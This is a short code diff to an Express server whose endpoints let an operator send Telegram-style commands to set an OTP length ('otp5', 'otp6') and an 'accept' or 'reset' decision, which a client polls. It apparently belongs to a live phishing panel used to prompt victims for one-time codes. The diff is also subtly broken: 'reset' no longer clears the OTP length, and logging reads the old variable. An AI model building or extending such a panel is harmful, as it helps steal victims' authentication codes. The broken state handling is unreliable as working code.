@@ -86,14 +86,14 @@ app.get("/telegram-command", (req, res) => {
   const cmd = req.query.cmd;
 
   // 🔥 FORCE RESET FIRST
-  otpLength = null;
+  global.otpLength = global.otpLength || null;
 
   if (cmd === "otp5") {
-    otpLength = 5;
+   global.otpLength  = 5;
   }
 
   if (cmd === "otp6") {
-    otpLength = 6;
+    global.otpLength = 6;
   }
 
   if (cmd === "accept") {
@@ -105,8 +105,7 @@ app.get("/telegram-command", (req, res) => {
   }
 
   if (cmd === "reset") {
-    otpLength = null;
-    decision = null;
+        decision = null;
   }
 
   console.log("NEW STATE:", { otpLength, decision });
@@ -126,7 +125,7 @@ app.post("/set-otp", (req, res) => {
 
   
 
-  otpLength = otp;
+  global.otpLength = otp;
 
   console.log("✅ OTP SET TO:", otpLength);
 
@@ -134,7 +133,7 @@ app.post("/set-otp", (req, res) => {
 });
 
 app.get("/otp-status", (req, res) => {
-  res.json({ otp: otpLength });
+  res.json({ otp: global.otpLength });
 });
 
 app.get("/decision-status", (req, res) => {
